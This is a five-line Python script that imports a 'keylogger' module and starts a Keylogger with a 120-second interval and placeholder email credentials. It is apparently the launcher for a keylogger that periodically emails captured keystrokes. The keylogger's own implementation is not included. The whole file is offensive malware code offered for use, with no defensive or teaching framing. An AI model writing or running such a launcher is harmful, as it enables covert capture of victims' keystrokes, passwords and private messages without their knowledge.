#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(120, "EMAIL_ID", "PASSWORD")
my_keylogger.start()